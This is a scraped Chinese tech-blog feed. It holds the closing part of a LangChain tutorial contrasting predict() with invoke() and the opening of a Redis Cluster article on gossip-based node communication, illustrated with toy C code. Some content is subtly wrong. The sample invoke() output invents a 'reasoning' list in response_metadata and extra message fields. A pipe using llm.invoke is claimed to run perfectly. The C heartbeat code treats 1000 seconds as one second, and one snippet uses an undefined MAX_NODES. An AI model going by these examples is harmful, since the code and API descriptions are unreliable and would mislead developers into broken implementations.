llm = ChatOpenAI(model=<span class="hljs-string">"gpt-4"</span>)

<span class="hljs-comment"># 使用 predict</span>
result = llm.predict(<span class="hljs-string">"将以下 SIP INVITE 转换为 GA/T 1400 XML格式: INVITE sip:34020000001320000001@..."</span>)

<span class="hljs-built_in">print</span>(result)
<span class="hljs-comment"># 输出：只有一段XML文本字符串，没有解析状态、没有验证结果、没有错误信息</span>
</code></pre>
<p><strong>问题：</strong></p>
<ul>
<li>无法知道转换是否成功</li>
<li>没有中间推理步骤</li>
<li>无法追溯错误原因</li>
<li>不能进行后续工具调用</li>
</ul>
<hr/>
<h4 data-id="heading-12">6.2 使用 invoke() - 完整信息✅</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI
<span class="hljs-keyword">from</span> langchain_core.tools <span class="hljs-keyword">import</span> tool

<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_gat1400_xml</span>(<span class="hljs-params">xml_content: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">dict</span>:
    <span class="hljs-string">"""验证 GA/T 1400 XML 格式是否符合标准"""</span>
    <span class="hljs-comment"># 验证逻辑</span>
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"valid"</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">"errors"</span>: []}

llm_with_tools = ChatOpenAI(model=<span class="hljs-string">"gpt-4"</span>).bind_tools([validate_gat1400_xml])

<span class="hljs-comment"># 使用 invoke</span>
result = llm_with_tools.invoke(<span class="hljs-string">"将以下 SIP INVITE 转换为 GA/T 1400 XML格式: INVITE sip:34020000001320000001@..."</span>)

<span class="hljs-built_in">print</span>(result)
</code></pre>
<p><strong>输出结构：</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"&lt;?xml version=\"1.0\"?&gt;&lt;Query&gt;&lt;CmdType&gt;Catalog&lt;/CmdType&gt;...&lt;/Query&gt;"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"tool_calls"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"validate_gat1400_xml"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"xml_content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"&lt;?xml version=\"1.0\"?&gt;..."</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"call_validate_001"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"response_metadata"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"finish_reason"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tool_calls"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"reasoning"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"1. 解析 SIP INVITE 头部"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"2. 提取设备ID 34020000001320000001"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"3. 映射到 GA/T 1400 DeviceID 字段"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"4. 构建 XML 结构"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"5. 调用验证工具"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>优势：</strong></p>
<p>✅ 可以追溯每一步转换逻辑</p>
<p>✅ 自动调用验证工具</p>
<p>✅ 包含完整的 metadata</p>
<p>✅ 可以集成到 Agent 工作流</p>
<hr/>
<h3 data-id="heading-13">7. 场景选择指南（快速决策）</h3>
<h4 data-id="heading-14"><strong>你只要一句聊天文本 → predict()</strong></h4>
<p>例如：</p>
<ul>
<li>聊天机器人一句回复</li>
<li>简单答疑</li>
<li>快速原型验证</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 适用场景</span>
response = llm.predict(<span class="hljs-string">"今天天气怎么样？"</span>)
</code></pre>
<hr/>
<h4 data-id="heading-15"><strong>你做实际系统开发 → invoke()</strong></h4>
<p>例如：</p>
<ul>
<li>数据格式转换（XML ↔ JSON）</li>
<li>SQL 自动生成</li>
<li>SIP / GA1400 协议处理</li>
<li>多步骤 LCEL Chain</li>
<li>Agent 工具调用</li>
<li>多轮会话管理</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 适用场景</span>
result = llm.invoke([
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"你是 GA/T 1400 协议专家"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"解析这条 SIP 消息"</span>}
])
</code></pre>
<hr/>
<h3 data-id="heading-16">8. 内部结构差异（类图）</h3>
<h4 data-id="heading-17">8.1 predict() 输出结构（只有文本）</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">classDiagram
    class PredictOutput {
        +str content
    }
</code></pre>
<h4 data-id="heading-18">8.2 invoke() 输出结构（包含完整元信息）</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">classDiagram
    class InvokeOutput {
        +string content
        +list tool_calls
        +dict response_metadata
        +list messages
        +string reasoning
        +string id
        +dict usage_metadata
    }
    
    class ToolCall {
        +string name
        +dict args
        +string id
    }
    
    class ResponseMetadata {
        +string finish_reason
        +string model
        +dict token_usage
        +list reasoning_steps
    }
    
    InvokeOutput "1" --&gt; "*" ToolCall
    InvokeOutput "1" --&gt; "1" ResponseMetadata
</code></pre>
<hr/>
<h3 data-id="heading-19">9. predict() 常踩的坑（必须避免）</h3>
<h4 data-id="heading-20">❌ 1. 在 Agent 中使用 predict()</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 错误示例</span>
agent = create_openai_functions_agent(llm, tools, prompt)
result = agent.predict(<span class="hljs-string">"查询数据库"</span>)  <span class="hljs-comment"># 工具调用丢失！</span>
</code></pre>
<p><strong>后果：</strong> Agent 无法调用工具，功能完全失效</p>
<hr/>
<h4 data-id="heading-21">2. 在 SQL Chain 中用 predict()</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 错误示例</span>
sql_chain = create_sql_query_chain(llm, db)
query = sql_chain.predict(<span class="hljs-string">"查询销售额前10的产品"</span>)  <span class="hljs-comment"># reasoning 消失</span>
</code></pre>
<p><strong>后果：</strong> 无法追溯 SQL 生成逻辑，调试困难</p>
<hr/>
<h4 data-id="heading-22">3. 多轮 messages 被压成一段文本</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 错误示例</span>
history = [
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我叫张三"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"assistant"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"你好张三"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"我叫什么？"</span>}
]
response = llm.predict(<span class="hljs-built_in">str</span>(history))  <span class="hljs-comment"># 上下文彻底丢失</span>
</code></pre>
<p><strong>后果：</strong> 模型看到的是字符串而不是结构化对话</p>
<hr/>
<h4 data-id="heading-23">4. LCEL 链式组合报类型错误</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 错误示例</span>
chain = prompt | llm.predict | output_parser  <span class="hljs-comment"># TypeError!</span>
</code></pre>
<p><strong>后果：</strong> predict() 返回 <code>str</code> 无法兼容 LCEL 管道</p>
<hr/>
<p><strong>正确做法：</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ✅ 正确示例</span>
chain = prompt | llm.invoke | output_parser  <span class="hljs-comment"># 完美运行</span>
</code></pre>
<hr/>
<h3 data-id="heading-24">10. 性能对比</h3>






























<table><thead><tr><th>维度</th><th>predict()</th><th>invoke()</th></tr></thead><tbody><tr><td>执行速度</td><td>略快（5-10ms）</td><td>标准</td></tr><tr><td>内存占用</td><td>低</td><td>中等</td></tr><tr><td>可调试性</td><td>差</td><td>优秀</td></tr><tr><td>生产环境适用性</td><td>不推荐</td><td>强烈推荐</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-25">11. 最终总结（4 句话记住）</h3>
<ol>
<li><strong>predict = 文本</strong></li>
<li><strong>invoke = 对象</strong></li>
<li><strong>聊天用 predict</strong></li>
<li><strong>做项目用 invoke</strong></li>
</ol>
<h4 data-id="heading-26">🔥 我再唠叨一句</h4>
<p>在实际的<strong>SQL 自动生成</strong>、<strong>多模型推理</strong>、<strong>LLM API 开发</strong> 中：</p>
<p><strong>100% 都必须使用 invoke()</strong></p>
<hr/>
<h3 data-id="heading-27">12. 快速决策流程图</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[需要调用 LLM] --&gt; B{只要一句回复?}
    B --&gt;|是| C[predict]
    B --&gt;|否| D{需要以下任一功能?}
    D --&gt; E[工具调用]
    D --&gt; F[推理步骤]
    D --&gt; G[多轮对话]
    D --&gt; H[Chain/Agent]
    E --&gt; I[invoke]
    F --&gt; I
    G --&gt; I
    H --&gt; I
    C --&gt; J[返回 str]
    I --&gt; K[返回 AIMessage]
</code></pre>
<hr/>
<h3 data-id="heading-28">附录：完整代码模板</h3>
<h4 data-id="heading-29">A. predict() 模板（简单聊天）</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI

llm = ChatOpenAI(model=<span class="hljs-string">"gpt-4"</span>)
response = llm.predict(<span class="hljs-string">"你好，介绍一下自己"</span>)
<span class="hljs-built_in">print</span>(response)
</code></pre>
<h4 data-id="heading-30">B. invoke() 模板（生产系统）</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI
<span class="hljs-keyword">from</span> langchain_core.messages <span class="hljs-keyword">import</span> HumanMessage, SystemMessage

llm = ChatOpenAI(model=<span class="hljs-string">"gpt-4"</span>)

messages = [
    SystemMessage(content=<span class="hljs-string">"你是 GA/T 1400 协议专家"</span>),
    HumanMessage(content=<span class="hljs-string">"解析这条 SIP INVITE 消息"</span>)
]

result = llm.invoke(messages)

<span class="hljs-comment"># 访问完整结构</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"内容: <span class="hljs-subst">{result.content}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"工具调用: <span class="hljs-subst">{result.tool_calls}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"元数据: <span class="hljs-subst">{result.response_metadata}</span>"</span>)
</code></pre>
<p><strong>参考资源：</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fpython.langchain.com%2Fdocs%2Fmodules%2Fmodel_io%2F" target="_blank" title="https://python.langchain.com/docs/modules/model_io/" ref="nofollow noopener noreferrer">LangChain 官方文档</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Redis（144）Redis的Cluster的节点通信是如何实现的？]]></title>    <link>https://juejin.cn/post/7576155969605140515</link>    <guid>https://juejin.cn/post/7576155969605140515</guid>    <pubDate>2025-11-24T22:56:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576155969605140515" data-draft-id="7576187677838442511" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Redis（144）Redis的Cluster的节点通信是如何实现的？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T22:56:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Redis（144）Redis的Cluster的节点通信是如何实现的？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T22:56:42.000Z" title="Mon Nov 24 2025 22:56:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Redis Cluster 的节点通信是其核心功能之一，保证了节点之间的数据同步、故障检测和集群管理。Redis Cluster 使用 Gossip 协议进行节点间通信，并通过 TCP 进行点对点的消息传递。节点间的消息通常包括心跳（Ping/Pong）、故障报告、槽分配信息等。</p>
<h3 data-id="heading-0">节点通信实现步骤</h3>
<ol>
<li><strong>节点发现</strong>：集群节点需要知道其他节点的存在，并与它们建立通信。</li>
<li><strong>心跳检测</strong>：节点之间定期发送心跳消息（Ping），以确认它们的健康状态。</li>
<li><strong>消息处理</strong>：节点收到的消息需要进行解析和处理。</li>
<li><strong>故障检测</strong>：如果一个节点长时间未响应心跳消息，它可能会被标记为失败。</li>
<li><strong>数据同步</strong>：节点间的数据变化（例如槽分配）需要同步到整个集群。</li>
</ol>
<h3 data-id="heading-1">详细实现步骤和代码示例</h3>
<h4 data-id="heading-2">1. 节点发现</h4>
<p>节点发现是通过配置文件或启动参数指定集群的初始节点，然后通过这些初始节点发现其他节点。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_NODES 10</span>

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">clusterNode</span> {</span>
    <span class="hljs-type">char</span> name[<span class="hljs-number">40</span>];      <span class="hljs-comment">/* Node ID */</span>
    <span class="hljs-type">char</span> ip[<span class="hljs-number">16</span>];        <span class="hljs-comment">/* Node IP */</span>
    <span class="hljs-type">int</span> port;           <span class="hljs-comment">/* Node Port */</span>
} clusterNode;

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cluster</span> {</span>
    clusterNode nodes[MAX_NODES];
    <span class="hljs-type">int</span> node_count;
} cluster;

<span class="hljs-comment">/* Function to add a node to the cluster */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">addNode</span><span class="hljs-params">(cluster *cl, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ip, <span class="hljs-type">int</span> port)</span> {
    <span class="hljs-keyword">if</span> (cl-&gt;node_count &lt; MAX_NODES) {
        <span class="hljs-built_in">strcpy</span>(cl-&gt;nodes[cl-&gt;node_count].name, name);
        <span class="hljs-built_in">strcpy</span>(cl-&gt;nodes[cl-&gt;node_count].ip, ip);
        cl-&gt;nodes[cl-&gt;node_count].port = port;
        cl-&gt;node_count++;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Cluster node limit reached\n"</span>);
    }
}

<span class="hljs-comment">/* Example usage */</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    cluster cl = {<span class="hljs-number">0</span>};

    addNode(&amp;cl, <span class="hljs-string">"node1"</span>, <span class="hljs-string">"192.168.1.1"</span>, <span class="hljs-number">6379</span>);
    addNode(&amp;cl, <span class="hljs-string">"node2"</span>, <span class="hljs-string">"192.168.1.2"</span>, <span class="hljs-number">6379</span>);

    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cl.node_count; i++) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Node %s: %s:%d\n"</span>, cl.nodes[i].name, cl.nodes[i].ip, cl.nodes[i].port);
    }

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-3">2. 心跳检测</h4>
<p>心跳消息用于节点之间的健康检查，通常是 Ping/Pong 消息，用于确认节点是否在线。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> HEARTBEAT_INTERVAL 1000  <span class="hljs-comment">// 1 second</span></span>

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">clusterNode</span> {</span>
    <span class="hljs-type">char</span> name[<span class="hljs-number">40</span>];      <span class="hljs-comment">/* Node ID */</span>
    <span class="hljs-type">char</span> ip[<span class="hljs-number">16</span>];        <span class="hljs-comment">/* Node IP */</span>
    <span class="hljs-type">int</span> port;           <span class="hljs-comment">/* Node Port */</span>
    <span class="hljs-type">time_t</span> last_heartbeat; <span class="hljs-comment">/* Last time a heartbeat was received */</span>
} clusterNode;

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cluster</span> {</span>
    clusterNode nodes[MAX_NODES];
    <span class="hljs-type">int</span> node_count;
} cluster;

<span class="hljs-comment">/* Function to send heartbeat message */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">sendHeartbeat</span><span class="hljs-params">(clusterNode *node)</span> {
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Sending heartbeat to node %s\n"</span>, node-&gt;name);
    <span class="hljs-comment">// In a real implementation, here you would send a PING message over the network.</span>
    node-&gt;last_heartbeat = time(<span class="hljs-literal">NULL</span>);
}

<span class="hljs-comment">/* Function to check for node failures based on heartbeat */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">checkHeartbeat</span><span class="hljs-params">(clusterNode *node)</span> {
    <span class="hljs-type">time_t</span> now = time(<span class="hljs-literal">NULL</span>);
    <span class="hljs-keyword">if</span> (now - node-&gt;last_heartbeat &gt; HEARTBEAT_INTERVAL) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Node %s is not responding\n"</span>, node-&gt;name);
        <span class="hljs-comment">// Mark node as failed</span>
        <span class="hljs-comment">// In a real implementation, update the node's status</span>
    }
}

<span class="hljs-comment">/* Example usage */</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    clusterNode node = {<span class="hljs-string">"node1"</span>, <span class="hljs-string">"192.168.1.1"</span>, <span class="hljs-number">6379</span>, time(<span class="hljs-literal">NULL</span>)};

    <span class="hljs-comment">// Periodically send heartbeat</span>
    sendHeartbeat(&amp;node);

    <span class="hljs-comment">// Simulate a delay in heartbeat</span>
    node.last_heartbeat = time(<span class="hljs-literal">NULL</span>) - <span class="hljs-number">2</span>;

    <span class="hljs-comment">// Check heartbeat</span>
    checkHeartbeat(&amp;node);

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-4">3. 消息处理</h4>
<p>节点收到的消息需要进行解析和处理，根据消息类型执行不同的操作。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">clusterNode</span> {</span>
    <span class="hljs-type">char</span> name[<span class="hljs-number">40</span>];      <span class="hljs-comment">/* Node ID */</span>
    <span class="hljs-type">char</span> ip[<span class="hljs-number">16</span>];        <span class="hljs-comment">/* Node IP */</span>
    <span class="hljs-type">int</span> port;           <span class="hljs-comment">/* Node Port */</span>
    <span class="hljs-comment">// other fields...</span>
} clusterNode;

<span class="hljs-comment">/* Enum for message types */</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> {</span>
    MSG_TYPE_PING,
    MSG_TYPE_PONG,
    MSG_TYPE_FAIL,
    <span class="hljs-comment">// other message types...</span>
} msgType;

<span class="hljs-comment">/* Function to process received messages */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">processMessage</span><span class="hljs-params">(clusterNode *node, msgType type)</span> {
    <span class="hljs-keyword">switch</span> (type) {
        <span class="hljs-keyword">case</span> MSG_TYPE_PING:
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Received PING from node %s\n"</span>, node-&gt;name);
            <span class="hljs-comment">// Send PONG response</span>
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> MSG_TYPE_PONG:
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Received PONG from node %s\n"</span>, node-&gt;name);
            <span class="hljs-comment">// Update node status</span>
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> MSG_TYPE_FAIL:
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Received FAIL for node %s\n"</span>, node-&gt;name);
            <span class="hljs-comment">// Mark node as failed</span>
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Unknown message type\n"</span>);
            <span class="hljs-keyword">break</span>;
    }
}

<span class="hljs-comment">/* Example usage */</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    clusterNode node = {<span class="hljs-string">"node1"</span>, <span class="hljs-string">"192.168.1.1"</span>, <span class="hljs-number">6379</span>};

    <span class="hljs-comment">// Simulate receiving a PING message</span>
    processMessage(&amp;node, MSG_TYPE_PING);

    <span class="hljs-comment">// Simulate receiving a PONG message</span>
    processMessage(&amp;node, MSG_TYPE_PONG);

    <span class="hljs-comment">// Simulate receiving a FAIL message</span>
    processMessage(&amp;node, MSG_TYPE_FAIL);

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-5">4. 故障检测</h4>
<p>通过心跳检测和故障报告，节点可以检测到其他节点的故障，并采取相应的措施。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> HEARTBEAT_INTERVAL 1000  <span class="hljs-comment">// 1 second</span></span>

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">clusterNode</span> {</span>
    <span class="hljs-type">char</span> name[<span class="hljs-number">40</span>];      <span class="hljs-comment">/* Node ID */</span>
    <span class="hljs-type">char</span> ip[<span class="hljs-number">16</span>];        <span class="hljs-comment">/* Node IP */</span>
    <span class="hljs-type">int</span> port;           <span class="hljs-comment">/* Node Port */</span>
